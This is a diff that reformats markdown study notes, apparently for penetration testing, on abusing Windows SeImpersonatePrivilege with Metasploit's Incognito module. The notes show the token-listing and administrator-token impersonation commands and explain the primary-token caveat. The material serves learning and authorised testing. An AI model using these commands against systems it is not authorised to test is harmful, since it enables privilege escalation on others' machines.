@@ -82,27 +82,28 @@ Most commonly abused privileges include:
 **Incognito module used to exploit SeImpersonatePrivilege** 
 
 - To view available tokens, enter `list_tokens -g`
-    BUILTIN\Administrators
-    BUILTIN\Users
-    NT AUTHORITY\Authenticated Users
-    NT AUTHORITY\NTLM Authentication
-    NT AUTHORITY\SERVICE
-    NT AUTHORITY\This Organization
-    NT SERVICE\AudioEndpointBuilder
-    NT SERVICE\CertPropSvc
-    NT SERVICE\CscService
-    NT SERVICE\iphlpsvc
-    NT SERVICE\LanmanServer
-    NT SERVICE\PcaSvc
-    NT SERVICE\Schedule
-    NT SERVICE\SENS
-    NT SERVICE\SessionEnv
-    NT SERVICE\TrkWks
-    NT SERVICE\UmRdpService
-    NT SERVICE\UxSms
-    NT SERVICE\Winmgmt
-    NT SERVICE\wuauserv
-
+```
+BUILTIN\Administrators
+BUILTIN\Users
+NT AUTHORITY\Authenticated Users
+NT AUTHORITY\NTLM Authentication
+NT AUTHORITY\SERVICE
+NT AUTHORITY\This Organization
+NT SERVICE\AudioEndpointBuilder
+NT SERVICE\CertPropSvc
+NT SERVICE\CscService
+NT SERVICE\iphlpsvc
+NT SERVICE\LanmanServer
+NT SERVICE\PcaSvc
+NT SERVICE\Schedule
+NT SERVICE\SENS
+NT SERVICE\SessionEnv
+NT SERVICE\TrkWks
+NT SERVICE\UmRdpService
+NT SERVICE\UxSms
+NT SERVICE\Winmgmt
+NT SERVICE\wuauserv
+```
 - To impersonate Administrators' token, run `impersonate_token "BUILTIN\Administrators"`
 
 > Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).
